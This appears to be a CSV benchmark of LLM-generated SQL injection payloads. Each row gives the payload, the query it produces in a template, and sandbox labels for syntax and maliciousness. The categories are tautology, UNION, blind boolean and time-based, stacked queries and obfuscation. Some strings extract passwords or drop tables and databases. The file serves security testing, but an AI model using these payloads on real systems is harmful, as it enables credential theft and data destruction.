id,seed_query,candidate_query,context,syntax_valid,sandbox_malicious,notes
11,status LIKE '%%' OR '1'='1',SELECT * FROM orders WHERE status = 'status LIKE '%%' OR '1'='1'' ORDER BY date DESC,product_filter,false,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
12,SELECT * FROM orders WHERE status = 'cancelled' OR (SELECT 1 FROM (SELECT 0)),SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = 'cancelled' OR (SELECT 1 FROM (SELECT 0))' ORDER BY date DESC,product_filter,false,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
13,"1 OR ""'""=""'","INSERT INTO comments (user_id, body) VALUES (1, '1 OR ""'""=""'')",profile_update,false,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
14,1 OR /* */ 1=1,"INSERT INTO comments (user_id, body) VALUES (1, '1 OR /* */ 1=1')",profile_update,true,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
15,1 OR -- 1,"INSERT INTO comments (user_id, body) VALUES (1, '1 OR -- 1')",profile_update,true,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
16,SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'' AND password = 'anything',login,false,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
17,SELECT * FROM users WHERE username = (SELECT username FROM admins LIMIT 1) AND password = '' OR '1'='1',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = (SELECT username FROM admins LIMIT 1) AND password = '' OR '1'='1'' AND password = 'anything',login,false,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
18,"SELECT * FROM users WHERE username = CHAR(97,100,109,105,'n') COLLATE utf8mb4_general_ci AND password = 'ignore'","SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = CHAR(97,100,109,105,'n') COLLATE utf8mb4_general_ci AND password = 'ignore'' AND password = 'anything'",login,false,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
19,"' OR '1'='1 UNION SELECT username, password FROM users --","SELECT * FROM products WHERE name LIKE '%' OR '1'='1 UNION SELECT username, password FROM users --%'",search,true,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
20,"` OR `1`=`1 UNION SELECT email, phone FROM customers /*","SELECT * FROM products WHERE name LIKE '%` OR `1`=`1 UNION SELECT email, phone FROM customers /*%'",search,true,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
21,"'; DROP TABLE IF EXISTS temp; CREATE TABLE temp AS SELECT id, CONCAT(username, ':', password) AS creds FROM users; --","SELECT * FROM products WHERE name LIKE '%'; DROP TABLE IF EXISTS temp; CREATE TABLE temp AS SELECT id, CONCAT(username, ':', password) AS creds FROM users; --%'",search,true,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
22,SELECT * FROM users WHERE id = ' OR '1'='1,SELECT * FROM users WHERE id = SELECT * FROM users WHERE id = ' OR '1'='1,id_lookup,false,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
23,"-- -
UNION SELECT password FROM users WHERE id = '-- -'","SELECT * FROM users WHERE id = -- -
UNION SELECT password FROM users WHERE id = '-- -'",id_lookup,false,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
24,/* comment */ UNION SELECT username FROM users WHERE id = '#comment',SELECT * FROM users WHERE id = /* comment */ UNION SELECT username FROM users WHERE id = '#comment',id_lookup,false,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
25,"UNION SELECT username, password FROM users --""","SELECT * FROM orders WHERE status = 'UNION SELECT username, password FROM users --""' ORDER BY date DESC",product_filter,true,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
26,"OR 1=1;--""""""","SELECT * FROM orders WHERE status = 'OR 1=1;--""""""' ORDER BY date DESC",product_filter,true,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
27,; DROP TABLE IF EXISTS temp_table; --,SELECT * FROM orders WHERE status = '; DROP TABLE IF EXISTS temp_table; --' ORDER BY date DESC,product_filter,true,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
28,1); --,"INSERT INTO comments (user_id, body) VALUES (1, '1); --')",profile_update,true,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
29,"1');/**/UNION/**/SELECT/**/user_id,/**/password/**/FROM/**/users--","INSERT INTO comments (user_id, body) VALUES (1, '1');/**/UNION/**/SELECT/**/user_id,/**/password/**/FROM/**/users--')",profile_update,false,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
30,1 OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '1 OR '1'='1')",profile_update,false,false,attack_category=union_based; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
31,' OR '1'='1,SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything',login,true,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
32,'; DROP TABLE IF EXISTS fakeusers; --,SELECT * FROM users WHERE username = ''; DROP TABLE IF EXISTS fakeusers; --' AND password = 'anything',login,true,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
33,username LIKE '%admin%' AND password LIKE '%admin%,SELECT * FROM users WHERE username = 'username LIKE '%admin%' AND password LIKE '%admin%' AND password = 'anything',login,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
34,"[""%\' AND 1=1 --""","SELECT * FROM products WHERE name LIKE '%[""%\' AND 1=1 --""%'",search,true,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
35,"\' OR 1=1 /*""","SELECT * FROM products WHERE name LIKE '%\' OR 1=1 /*""%'",search,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
36,"%\') OR 1=0; -- \'""","SELECT * FROM products WHERE name LIKE '%%\') OR 1=0; -- \'""%'",search,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
37,"\' AND (SELECT 1 FROM users WHERE username = 'admin') --""","SELECT * FROM products WHERE name LIKE '%\' AND (SELECT 1 FROM users WHERE username = 'admin') --""%'",search,true,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
38,"\' OR 1=1 UNION SELECT NULL, NULL, password FROM users --""]","SELECT * FROM products WHERE name LIKE '%\' OR 1=1 UNION SELECT NULL, NULL, password FROM users --""]%'",search,true,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
39,(SELECT CASE WHEN (SELECT 1 FROM users WHERE username = 'admin') THEN 1 ELSE 0 END),SELECT * FROM users WHERE id = (SELECT CASE WHEN (SELECT 1 FROM users WHERE username = 'admin') THEN 1 ELSE 0 END),id_lookup,true,true,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview
40,{--} OR 1=1 {--},SELECT * FROM users WHERE id = {--} OR 1=1 {--},id_lookup,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
41,(CASE WHEN (SELECT password FROM users WHERE id = 1 LIMIT 1) LIKE '%a%' THEN 1 ELSE 0 END),SELECT * FROM users WHERE id = (CASE WHEN (SELECT password FROM users WHERE id = 1 LIMIT 1) LIKE '%a%' THEN 1 ELSE 0 END),id_lookup,true,true,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview
42,' OR 1=1 --,SELECT * FROM orders WHERE status = '' OR 1=1 --' ORDER BY date DESC,product_filter,true,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
43,' AND '1'='1',SELECT * FROM orders WHERE status = '' AND '1'='1'' ORDER BY date DESC,product_filter,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
44,CASE WHEN 1=1 THEN '1' ELSE '' END,SELECT * FROM orders WHERE status = 'CASE WHEN 1=1 THEN '1' ELSE '' END' ORDER BY date DESC,product_filter,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
45,' OR 1=1 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 --')",profile_update,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
46,' AND 1=1 /*,"INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1 /*')",profile_update,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
47,'; DROP TABLE users;--,"INSERT INTO comments (user_id, body) VALUES (1, ''; DROP TABLE users;--')",profile_update,false,false,attack_category=blind_boolean; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
48,' OR '1'='1' -- -,SELECT * FROM users WHERE username = '' OR '1'='1' -- -' AND password = 'anything',login,true,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
49,' OR SLEEP(5) -- -,SELECT * FROM users WHERE username = '' OR SLEEP(5) -- -' AND password = 'anything',login,true,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
50,'; WAITFOR DELAY '00:00:05' -- -,SELECT * FROM users WHERE username = ''; WAITFOR DELAY '00:00:05' -- -' AND password = 'anything',login,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
51,"' OR '1'='1' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%' || SUBSTRING(password, 1, 1) || '%' SLEEP(5)) --","SELECT * FROM products WHERE name LIKE '%' OR '1'='1' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%' || SUBSTRING(password, 1, 1) || '%' SLEEP(5)) --%'",search,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
52,""" OR ""1""=""1"" AND (SELECT IF(SUBSTRING(password, 1, 1) = 'a', sleep(5), NULL) FROM users)","SELECT * FROM products WHERE name LIKE '%"" OR ""1""=""1"" AND (SELECT IF(SUBSTRING(password, 1, 1) = 'a', sleep(5), NULL) FROM users)%'",search,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
53,"' OR '1'='1' AND (BENCHMARK(1000000, MD5('')))","SELECT * FROM products WHERE name LIKE '%' OR '1'='1' AND (BENCHMARK(1000000, MD5('')))%'",search,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
54,OR 1=1 --,SELECT * FROM users WHERE id = OR 1=1 --,id_lookup,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
55,AND sleep(2) /*,SELECT * FROM users WHERE id = AND sleep(2) /*,id_lookup,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
56,OR 1=1; DROP TABLE users --,SELECT * FROM users WHERE id = OR 1=1; DROP TABLE users --,id_lookup,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
57,SELECT * FROM orders WHERE status = 'ACTIVE' AND 1=0 OR 1=1 --' OR SLEEP(5) OR '1'='1,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = 'ACTIVE' AND 1=0 OR 1=1 --' OR SLEEP(5) OR '1'='1' ORDER BY date DESC,product_filter,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
58,SELECT * FROM orders WHERE status = 'PENDING' AND EXTRACT(HOUR FROM NOW()) > 0 /*',SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = 'PENDING' AND EXTRACT(HOUR FROM NOW()) > 0 /*'' ORDER BY date DESC,product_filter,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
59,"SELECT * FROM orders WHERE status = 'SHIPPED' AND BENCHMARK(1000000,CRC32(RAND())) --'","SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = 'SHIPPED' AND BENCHMARK(1000000,CRC32(RAND())) --'' ORDER BY date DESC",product_filter,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
60,;/**/SLEEP(5);--,"INSERT INTO comments (user_id, body) VALUES (1, ';/**/SLEEP(5);--')",profile_update,true,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
61,';-- WAITFOR DELAY '00:00:05' --,"INSERT INTO comments (user_id, body) VALUES (1, '';-- WAITFOR DELAY '00:00:05' --')",profile_update,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
62,"/*
TIME_WAIT('5')
*/;WAITFOR DELAY '00:00:05'--","INSERT INTO comments (user_id, body) VALUES (1, '/*
TIME_WAIT('5')
*/;WAITFOR DELAY '00:00:05'--')",profile_update,false,false,attack_category=blind_time; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
63,; DROP TABLE IF EXISTS users; --,SELECT * FROM users WHERE username = '; DROP TABLE IF EXISTS users; --' AND password = 'anything',login,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
64,"'; CREATE TABLE hackers (id INTEGER PRIMARY KEY, name TEXT); --","SELECT * FROM users WHERE username = ''; CREATE TABLE hackers (id INTEGER PRIMARY KEY, name TEXT); --' AND password = 'anything'",login,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
65,"--; INSERT INTO users (username, password) VALUES ('admin', 'admin');","SELECT * FROM users WHERE username = '--; INSERT INTO users (username, password) VALUES ('admin', 'admin');' AND password = 'anything'",login,false,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
66,; DROP TABLE users; --,SELECT * FROM products WHERE name LIKE '%; DROP TABLE users; --%',search,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
67,; SELECT * FROM users WHERE username = 'admin' AND password = 'anything'; //,SELECT * FROM products WHERE name LIKE '%; SELECT * FROM users WHERE username = 'admin' AND password = 'anything'; //%',search,false,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
68,'; DROP DATABASE database_name;--,SELECT * FROM products WHERE name LIKE '%'; DROP DATABASE database_name;--%',search,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
69,; DROP TABLE users;,SELECT * FROM users WHERE id = ; DROP TABLE users;,id_lookup,false,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
70,"--
SELECT id FROM users --","SELECT * FROM users WHERE id = --
SELECT id FROM users --",id_lookup,false,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
71,/*malicious*/ ; DELETE FROM users;,SELECT * FROM users WHERE id = /*malicious*/ ; DELETE FROM users;,id_lookup,false,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
72,; DROP TABLE users --,SELECT * FROM orders WHERE status = '; DROP TABLE users --' ORDER BY date DESC,product_filter,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
73,"; DELETE FROM orders;
--","SELECT * FROM orders WHERE status = '; DELETE FROM orders;
--' ORDER BY date DESC",product_filter,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
74,--'; INSERT INTO logs VALUES ('hack');--,SELECT * FROM orders WHERE status = '--'; INSERT INTO logs VALUES ('hack');--' ORDER BY date DESC,product_filter,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
75,SELECT * FROM users; DROP TABLE comments; --,"INSERT INTO comments (user_id, body) VALUES (1, 'SELECT * FROM users; DROP TABLE comments; --')",profile_update,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
76,--'; DELETE FROM sessions; --,"INSERT INTO comments (user_id, body) VALUES (1, '--'; DELETE FROM sessions; --')",profile_update,false,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
77,"/* SQL Injection */; SELECT username, password FROM admin","INSERT INTO comments (user_id, body) VALUES (1, '/* SQL Injection */; SELECT username, password FROM admin')",profile_update,true,false,attack_category=stacked_queries; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
78,SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin'' AND password = 'anything',login,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
79,SELECT * FROM users WHERE username = 'admin' #AND password = 'admin',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' #AND password = 'admin'' AND password = 'anything',login,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
80,SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';,SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';' AND password = 'anything',login,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
81,/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94',SELECT * FROM products WHERE name LIKE '%/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94'%',search,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
82,--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%',SELECT * FROM products WHERE name LIKE '%--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%'%',search,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
83,#SELECT * FROM products WHERE name LIKE '/*%',SELECT * FROM products WHERE name LIKE '%#SELECT * FROM products WHERE name LIKE '/*%'%',search,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
84,--' OR '1'='1,SELECT * FROM users WHERE id = --' OR '1'='1,id_lookup,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
85,/**/1=1,SELECT * FROM users WHERE id = /**/1=1,id_lookup,true,true,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview
86,SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC' ORDER BY date DESC,product_filter,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
87,SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC' ORDER BY date DESC,product_filter,true,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
88,SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC' ORDER BY date DESC,product_filter,false,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
89,--' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '--' OR '1'='1')",profile_update,true,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
90,#' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '#' OR '1'='1')",profile_update,true,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
91,/**/' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '/**/' OR '1'='1')",profile_update,true,false,attack_category=comment_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
92,%27+OR+1=1;--,SELECT * FROM users WHERE username = '%27+OR+1=1;--' AND password = 'anything',login,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
93,%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;),SELECT * FROM users WHERE username = '%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;)' AND password = 'anything',login,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
94,"UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1","SELECT * FROM users WHERE username = 'UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1' AND password = 'anything'",login,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
95,%25' OR '1'='1,SELECT * FROM products WHERE name LIKE '%%25' OR '1'='1%',search,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
96,"' OR ASCII(SUBSTRING(username,1,1))=116 --","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING(username,1,1))=116 --%'",search,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
97,%23SELECT+*+FROM+users+WHERE+id+%3D+'admin',SELECT * FROM users WHERE id = %23SELECT+*+FROM+users+WHERE+id+%3D+'admin',id_lookup,false,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
98,SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),SELECT * FROM users WHERE id = SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),id_lookup,false,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
